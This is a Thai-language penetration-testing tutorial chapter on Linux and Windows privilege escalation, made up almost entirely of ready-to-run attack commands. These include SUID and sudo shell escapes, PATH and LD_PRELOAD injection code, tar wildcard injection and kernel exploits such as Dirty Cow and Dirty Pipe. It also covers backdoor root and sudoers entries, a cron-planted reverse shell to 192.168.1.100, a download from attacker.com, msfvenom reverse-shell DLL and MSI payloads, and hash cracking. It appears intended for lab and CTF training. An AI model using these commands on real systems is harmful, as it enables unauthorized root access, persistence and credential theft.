# Part 09: Privilege Escalation (Steps 81-90)

## บทนำ

Privilege Escalation คือกระบวนการยกระดับสิทธิ์จาก user ธรรมดาไปเป็น root/SYSTEM ซึ่งเป็นขั้นตอนสำคัญมากใน Penetration Testing ในบทนี้จะครอบคลุมทั้ง Linux และ Windows Privilege Escalation

---

## Step 81: Linux Privilege Escalation - Overview

### Enumeration Script

```bash
# ==========================================
# Linux Privilege Escalation Enumeration
# ==========================================

# LinPEAS - ดีที่สุด
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# หรือ upload
wget http://attacker.com/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# lse.sh (Linux Smart Enumeration)
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l 1        # level 1
./lse.sh -l 2        # level 2 (ละเอียดกว่า)

# unix-privesc-check
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check
chmod +x unix-privesc-check
./unix-privesc-check standard
./unix-privesc-check detailed

# ==========================================
# Manual Enumeration Checklist
# ==========================================

# System Info
uname -a
cat /proc/version
cat /etc/os-release
hostname

# Current User
id
whoami
sudo -l

# Users & Groups
cat /etc/passwd
cat /etc/group
cat /etc/shadow    # ถ้าอ่านได้

# Network
ip a
ip route
netstat -tulanp
ss -tulanp
cat /etc/hosts

# Running Processes
ps aux
ps -ef
top

# Cron Jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
find / -name crontab 2>/dev/null

# Services
systemctl list-units --type=service
service --status-all

# Installed Software
dpkg -l
rpm -qa
apt list --installed

# SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# World Writable
find / -perm -o+w -type f 2>/dev/null
find / -perm -o+w -type d 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# History
history
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.nano_history

# SSH Keys
ls -la ~/.ssh/
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Config Files with Credentials
cat /etc/mysql/my.cnf
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

---

## Step 82: SUID Binary Exploitation

```bash
# ==========================================
# SUID Files
# ==========================================

# หาไฟล์ SUID
find / -perm -u=s -type f 2>/dev/null

# Common SUID vulnerabilities:
# /usr/bin/nmap        - เวอร์ชันเก่า
# /usr/bin/vim         - GTFOBins
# /usr/bin/python      - GTFOBins
# /usr/bin/find        - GTFOBins
# /usr/bin/more        - GTFOBins
# /usr/bin/less        - GTFOBins
# /usr/bin/nano        - GTFOBins
# /usr/bin/cp          - Copy passwd
# /usr/bin/chmod       - Change permissions
# /usr/bin/chown       - Change ownership
# /usr/bin/awk         - Execute shell
# /usr/bin/perl        - Execute shell
# /usr/bin/bash        - Run as root
# /usr/bin/env         - Execute shell

# ==========================================
# GTFOBins Examples
# ==========================================
# https://gtfobins.github.io/

# bash SUID
bash -p                              # -p = privileged mode

# find SUID
find . -exec /bin/sh \; -quit
find . -exec /bin/bash -p \; -quit

# vim SUID
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
vim -c ':!/bin/bash -p'

# python SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl SUID
perl -e 'exec "/bin/sh -p";'

# awk SUID
awk 'BEGIN {system("/bin/bash -p")}'

# nmap SUID (version 2.02-5.21)
nmap --interactive
nmap> !sh

# env SUID
env /bin/sh -p

# less SUID
less /etc/passwd
# ใน less พิมพ์:
!/bin/sh

# more SUID
more /etc/passwd
# ใน more พิมพ์:
!/bin/sh

# nano SUID
nano /etc/passwd
# Ctrl+R Ctrl+X
# reset; sh 1>&0 2>&0

# cp SUID
# Copy SUID bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p

# chmod SUID
chmod 777 /etc/shadow
chmod +s /bin/bash

# chown SUID
chown root:root /tmp/owned_file

# ==========================================
# Custom Vulnerable Programs
# ==========================================

# ตัวอย่าง: SUID program ที่มี path injection
# โปรแกรม:
# int main() { setuid(0); system("ls"); }

# Attack: PATH injection
echo "/bin/bash" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
./suid_program       # runs /tmp/ls (our bash) as root

# ตัวอย่าง: SUID program ที่มี library injection
# โปรแกรม:
# int main() { setuid(0); printf("Hello"); }

# Attack: LD_PRELOAD (ถ้า sudoers อนุญาต)
cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -i");
}
EOF

gcc -shared -fPIC -nostartfiles -o /tmp/exploit.so /tmp/exploit.c
sudo LD_PRELOAD=/tmp/exploit.so program_name
```

---

## Step 83: Sudo Abuse

```bash
# ==========================================
# Sudo Privilege Escalation
# ==========================================

# ตรวจสอบ sudo permissions
sudo -l

# Output ตัวอย่าง:
# User user may run the following commands on box:
#     (ALL) NOPASSWD: /usr/bin/vim
#     (root) /usr/bin/find
#     (ALL : ALL) ALL

# ==========================================
# GTFOBins - Sudo
# ==========================================

# sudo vim
sudo vim -c ':!/bin/bash'
sudo vim -c ':py import os; os.execl("/bin/sh", "sh")'

# sudo find
sudo find . -exec /bin/bash \; -quit

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo python
sudo python3 -c 'import os; os.system("/bin/bash")'

# sudo perl
sudo perl -e 'exec "/bin/bash";'

# sudo ruby
sudo ruby -e 'exec "/bin/bash"'

# sudo less
sudo less /etc/shadow
!/bin/bash

# sudo nmap
sudo nmap --interactive
!bash

# sudo tcpdump
echo "chmod +s /bin/bash" > /tmp/rootme.sh
chmod +x /tmp/rootme.sh
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/rootme.sh -Z root
bash -p

# sudo man
sudo man man
!/bin/bash

# sudo cp
# Copy /etc/passwd แล้วเพิ่ม root user
sudo cp /etc/passwd /tmp/passwd_backup
echo "rootme:$(openssl passwd password):0:0:root:/root:/bin/bash" >> /etc/passwd
su rootme    # password: password

# sudo chmod
sudo chmod +s /bin/bash
bash -p

# sudo chown
sudo chown user:user /etc/shadow
cat /etc/shadow

# sudo env
sudo env /bin/bash

# sudo cat
sudo cat /etc/shadow

# ==========================================
# Sudo Version Vulnerabilities
# ==========================================

# Check sudo version
sudo --version

# CVE-2021-3156 (Baron Samedit) - sudo < 1.9.5p2
# https://github.com/blasty/CVE-2021-3156
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich 0   # Select target OS

# CVE-2019-14287 (sudo < 1.8.28)
# sudo -u#-1 command (sudo ทำงานด้วย UID -1 = root)
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
```

---

## Step 84: Cron Job Exploitation

```bash
# ==========================================
# Cron Job Privilege Escalation
# ==========================================

# ตรวจสอบ cron jobs
cat /etc/crontab
crontab -l
sudo crontab -l
ls -la /etc/cron.*
ls -la /var/spool/cron/crontabs/

# ==========================================
# Writable Script in Cron
# ==========================================

# ถ้า cron รัน script ที่เราเขียนได้
# /etc/crontab:
# * * * * * root /usr/local/bin/backup.sh

# ตรวจสอบ permission
ls -la /usr/local/bin/backup.sh
# -rw-rw-r-- 1 root users /usr/local/bin/backup.sh

# แก้ไข script
echo "chmod +s /bin/bash" >> /usr/local/bin/backup.sh
# รอ cron รัน
bash -p

# หรือ reverse shell
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" >> /usr/local/bin/backup.sh

# ==========================================
# PATH in Cron
# ==========================================

# /etc/crontab:
# PATH=/home/user:/usr/local/sbin:/usr/local/bin
# * * * * * root overwrite.sh

# สร้าง script ใน /home/user (อยู่ก่อนใน PATH)
echo "chmod +s /bin/bash" > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# รอ cron รัน
bash -p

# ==========================================
# Wildcard Injection in Cron
# ==========================================

# /etc/crontab:
# * * * * * root cd /tmp && tar czf /tmp/backup.tar.gz *

# Tar wildcard injection
echo "chmod +s /bin/bash" > /tmp/shell.sh
chmod +x /tmp/shell.sh
echo "" > "/tmp/--checkpoint=1"
echo "" > "/tmp/--checkpoint-action=exec=sh shell.sh"
# รอ cron รัน
bash -p

# ==========================================
# Pspy - Monitor Cron Jobs
# ==========================================

# ดาวน์โหลด pspy
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64           # Monitor all processes

# ดู cron ที่รันบ่อย
./pspy64 -pf -i 1000   # -i milliseconds interval
```

---

## Step 85: Kernel Exploits

```bash
# ==========================================
# Kernel Privilege Escalation
# ==========================================

# ตรวจสอบ kernel version
uname -r
uname -a
cat /proc/version

# ==========================================
# ค้นหา Kernel Exploits
# ==========================================

# searchsploit
searchsploit "linux kernel" | grep "privilege"
searchsploit "linux kernel 5.4"
searchsploit "linux local priv"

# Online resources:
# https://www.exploit-db.com/
# https://github.com/SecWiki/linux-kernel-exploits
# https://github.com/lucyoa/kernel-exploits

# ==========================================
# Common Kernel Exploits
# ==========================================

# Dirty Cow (CVE-2016-5195) - Linux Kernel 2.6.22-4.8.3
# Affects: Ubuntu, Debian, CentOS, RHEL
git clone https://github.com/dirtycow/dirtycow.github.io.git
cd dirtycow.github.io
gcc -pthread dirty.c -o dirty -lcrypt
./dirty    # ต้องใส่ root password ที่ต้องการ

# Dirty Pipe (CVE-2022-0847) - Linux Kernel 5.8-5.16.10
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
gcc exploit-1.c -o exploit-1
./exploit-1

# Overlayfs (CVE-2021-3493) - Ubuntu
git clone https://github.com/briskets/CVE-2021-3493.git
cd CVE-2021-3493
gcc exploit.c -o exploit
./exploit

# ==========================================
# Linux Exploit Suggester
# ==========================================

wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Output จะแสดง exploits ที่น่าจะใช้ได้
```

---

## Step 86: Misconfiguration Exploitation

```bash
# ==========================================
# NFS No Root Squash
# ==========================================

# ตรวจสอบ NFS shares
showmount -e 192.168.1.x
cat /etc/exports

# no_root_squash = อนุญาตให้ root บน client เป็น root บน server
# /home/share *(rw,sync,no_root_squash)

# Attack:
# บน attacker (root):
mount -t nfs 192.168.1.x:/home/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# บน victim:
/home/share/bash -p    # รันด้วย SUID

# ==========================================
# Weak File Permissions
# ==========================================

# /etc/passwd writable (เพิ่ม root user)
ls -la /etc/passwd

# ถ้า writable:
openssl passwd -1 password       # สร้าง hash
echo "rootme:\$1\$your_hash:0:0:root:/root:/bin/bash" >> /etc/passwd
su rootme                         # password: password

# /etc/shadow readable
cat /etc/shadow
# ใช้ hashcat crack

# /etc/sudoers writable
echo "username ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo bash

# ==========================================
# Docker Group
# ==========================================

# ถ้า user อยู่ใน docker group
id    # uid=1000(user) gid=1000(user) groups=1000(user),117(docker)

# Mount root filesystem ผ่าน Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# หรือ
docker run -v /:/host --rm -it ubuntu bash
chroot /host
whoami    # root

# ==========================================
# LXC/LXD Group
# ==========================================

id    # groups: lxd

# สร้าง Alpine container
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine

# Import image
lxc image import ./alpine.tar.gz --alias myimage

# สร้าง container ด้วย security.privileged=true
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
cd /mnt/root

# ==========================================
# Writable /etc/cron.d
# ==========================================

ls -la /etc/cron.d/
# ถ้า writable:
echo "* * * * * root chmod +s /bin/bash" > /etc/cron.d/rootme
# รอ 1 นาที
bash -p
```

---

## Step 87: Windows Privilege Escalation

```bash
# ==========================================
# Windows Privilege Escalation
# ==========================================

# ==========================================
# Enumeration Tools
# ==========================================

# WinPEAS
# ดาวน์โหลด:
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe

# ส่งไปยัง target ผ่าน meterpreter
upload winPEASany.exe C:/Windows/Temp/winPEAS.exe
shell
C:\Windows\Temp\winPEAS.exe

# PowerUp
# ดาวน์โหลด:
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

# รันใน PowerShell
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# ==========================================
# Manual Windows Enumeration
# ==========================================
# ใน shell/cmd.exe:

# System info
systeminfo
whoami /all
net user
net localgroup administrators
net localgroup

# Services
sc query
tasklist /SVC
wmic service list brief

# Processes
tasklist
tasklist /v

# Network
ipconfig /all
netstat -ano
arp -a
route print

# Installed software
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# Patches
wmic qfe get Caption,Description,HotFixID,InstalledOn
systeminfo | findstr /B /C:"OS Version" /C:"Hotfix(s)"

# Scheduled Tasks
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# ==========================================
# Token Impersonation
# ==========================================

# ใน meterpreter (ต้องมี SeImpersonatePrivilege):
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"

# Potato Exploits (SeImpersonatePrivilege)
# JuicyPotato, PrintSpoofer, RoguePotato, GodPotato

# PrintSpoofer
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe
upload PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe

# GodPotato
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

---

## Step 88: Windows Service Exploits

```bash
# ==========================================
# Unquoted Service Path
# ==========================================

# ค้นหา services ที่มี unquoted path
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /v """

# ตัวอย่าง:
# C:\Program Files\My Service\service.exe
# Windows จะลองหา:
# C:\Program.exe
# C:\Program Files\My.exe
# C:\Program Files\My Service\service.exe

# Attack:
# ถ้า C:\Program Files\ writable
echo "cmd.exe /c net user hacker password /add" > "C:\Program Files\My.exe"
net stop "MyService"
net start "MyService"
# หรือรอ reboot

# ==========================================
# Weak Service Permissions
# ==========================================

# ตรวจสอบ permissions ของ services
accesschk.exe -ucqv * /accepteula
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# ถ้า service มี write permission:
sc qc VulnService
sc config VulnService binPath= "cmd.exe /c net user hacker password /add"
net stop VulnService
net start VulnService

# ==========================================
# Weak Registry Permissions
# ==========================================

# ตรวจสอบ registry permissions
accesschk.exe -uvwqk HKLM\System\CurrentControlSet\Services\VulnService /accepteula

# แก้ไข registry
reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnService /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /k net user hacker password /add" /f

# ==========================================
# DLL Hijacking
# ==========================================

# บาง services โหลด DLL จาก directory ที่ไม่มี DLL นั้น
# ถ้าเราวาง DLL ชื่อเดียวกันใน directory ที่อ่านก่อน...

# ค้นหาด้วย Process Monitor (Procmon)
# Filter: PATH NOT FOUND หรือ NAME NOT FOUND

# สร้าง malicious DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll -o evil.dll
# วางใน directory ที่ service จะโหลดก่อน

# ==========================================
# AlwaysInstallElevated
# ==========================================

# ตรวจสอบ
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# ถ้าทั้งคู่ = 1 แสดงว่า vulnerable

# สร้าง malicious MSI
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi
```

---

## Step 89: Password Attacks

```bash
# ==========================================
# Password Cracking
# ==========================================

# ==========================================
# Hashcat
# ==========================================
sudo apt install hashcat

# ดู hash types
hashcat --example-hashes | less

# Common hash types:
# 0    = MD5
# 100  = SHA1
# 1400 = SHA256
# 1800 = sha512crypt (Linux $6$)
# 1000 = NTLM (Windows)
# 3000 = LM
# 5600 = NetNTLMv2
# 13100= Kerberos TGS
# 22000= WPA2

# ==========================================
# Attack modes
# ==========================================

# -a 0 = Dictionary attack
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# -a 1 = Combinator attack
hashcat -a 1 -m 0 hash.txt wordlist1.txt wordlist2.txt

# -a 3 = Brute force
hashcat -a 3 -m 0 hash.txt '?d?d?d?d?d?d'  # 6 digits

# -a 6 = Hybrid (wordlist + mask)
hashcat -a 6 -m 0 hash.txt wordlist.txt '?d?d?d'

# ==========================================
# Mask Characters
# ==========================================
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digits (0-9)
# ?s = special (!@#$...)
# ?a = all (?l?u?d?s)
# ?h = 0-9 and a-f (hex lowercase)
# ?H = 0-9 and A-F (hex uppercase)

# ==========================================
# Examples
# ==========================================

# Crack MD5
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Crack NTLM (Windows)
hashcat -a 0 -m 1000 ntlm_hash.txt /usr/share/wordlists/rockyou.txt

# Crack Linux SHA512
hashcat -a 0 -m 1800 shadow_hash.txt /usr/share/wordlists/rockyou.txt

# Crack with rules
hashcat -a 0 -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# ==========================================
# John the Ripper
# ==========================================
sudo apt install john

# Crack /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt
john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack specific hash
john --format=md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=sha512crypt hash.txt

# Crack ZIP password
zip2john protected.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack SSH key
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# ดูผลลัพธ์
john --show hash.txt

# ==========================================
# Online Hash Crackers
# ==========================================
# https://crackstation.net/
# https://hashes.com/en/decrypt/hash
# https://hashkiller.io/listmanager
# https://md5.gromweb.com/
```

---

## Step 90: Automated Privilege Escalation

### Using Automated Tools

```bash
# ==========================================
# Privilege Escalation Automation
# ==========================================

# ==========================================
# Linux Auto Privesc
# ==========================================

# PEASS-ng Suite
git clone https://github.com/carlospolop/PEASS-ng.git
cd PEASS-ng/linPEAS

# รันและบันทึกผล
./linpeas.sh | tee linpeas_output.txt
./linpeas.sh -a    # All checks

# สี:
# Red/Yellow = High findings
# Green = Good to know
# Blue = Info

# ==========================================
# Metasploit Local Exploit Suggester
# ==========================================

# ใน meterpreter session:
run post/multi/recon/local_exploit_suggester
run post/linux/local/exploit_suggester
run post/windows/escalate/getsystem

# ==========================================
# BeRoot - Windows
# ==========================================

git clone https://github.com/AlessandroZ/BeRoot.git
# ส่งไปยัง Windows target
# beRoot.exe

# ==========================================
# FullPowers - Windows Token
# ==========================================

wget https://github.com/itm4n/FullPowers/releases/latest/download/FullPowers.exe
.\FullPowers.exe -c "powershell.exe" -z

# ==========================================
# GTFOBins Search
# ==========================================

# Website: https://gtfobins.github.io/

# ค้นหา binary ที่ SUID
find / -perm -4000 -type f 2>/dev/null | while read binary; do
    name=$(basename $binary)
    echo "Checking $name..."
    # Check GTFOBins
done

# ==========================================
# Checklist Summary
# ==========================================

echo "=== PRIVILEGE ESCALATION CHECKLIST ==="
echo ""
echo "1. Kernel version vulnerabilities"
uname -r
echo ""
echo "2. SUID files"
find / -perm -4000 2>/dev/null
echo ""
echo "3. Sudo permissions"
sudo -l
echo ""
echo "4. Cron jobs"
cat /etc/crontab
crontab -l
echo ""
echo "5. World-writable files"
find / -perm -o+w -type f 2>/dev/null | grep -v proc | grep -v sys
echo ""
echo "6. Capabilities"
getcap -r / 2>/dev/null
echo ""
echo "7. Docker/LXC group"
id | grep -E "docker|lxd|lxc"
echo ""
echo "8. NFS no_root_squash"
cat /etc/exports
echo ""
echo "9. Config files"
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password" 2>/dev/null
echo ""
echo "10. SSH keys"
find / -name "id_rsa" 2>/dev/null
```

---

## สรุป Part 09

ในบทนี้คุณได้เรียนรู้:

✅ **Step 81**: Linux Privilege Escalation Overview  
✅ **Step 82**: SUID Binary Exploitation  
✅ **Step 83**: Sudo Abuse  
✅ **Step 84**: Cron Job Exploitation  
✅ **Step 85**: Kernel Exploits  
✅ **Step 86**: Misconfiguration Exploitation  
✅ **Step 87**: Windows Privilege Escalation  
✅ **Step 88**: Windows Service Exploits  
✅ **Step 89**: Password Attacks  
✅ **Step 90**: Automated Tools  

## แบบฝึกหัด

1. ทำ LinPEAS บน Metasploitable2 และวิเคราะห์ผล
2. Exploit SUID binary บน lab
3. ทำ Windows Privilege Escalation บน VulnHub machine
4. Crack hashes ด้วย hashcat
5. ทำ CTF challenge ที่เน้น Privilege Escalation

## ถัดไป: Part 10 - Post-Exploitation & Lateral Movement

---

*Part 09 | Steps 81-90 | ระดับ: สูง*
